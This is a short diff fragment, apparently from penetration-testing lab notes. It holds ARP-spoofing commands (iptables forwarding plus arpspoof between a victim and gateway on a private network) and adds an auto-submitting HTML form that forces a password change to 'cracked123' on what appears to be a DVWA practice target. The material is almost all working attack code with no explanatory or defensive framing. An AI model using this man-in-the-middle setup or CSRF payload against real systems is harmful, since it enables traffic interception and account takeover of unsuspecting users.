@@ -14,4 +14,10 @@ sudo iptables -A FORWARD -i eth0 -j ACCEPT
 
 sudo arpspoof -i eth0 -t 192.168.128.2 192.168.128.1
 
-
+<body onload="document.forms[0].submit()">
+<form action="http://192.168.128.2/dvwa/vulnerabilities/csrf/">
+  <input type="hidden" name="password_new"  value="cracked123">
+  <input type="hidden" name="password_conf" value="cracked123">
+  <input type="hidden" name="Change"        value="Change">
+</form>
+</body>
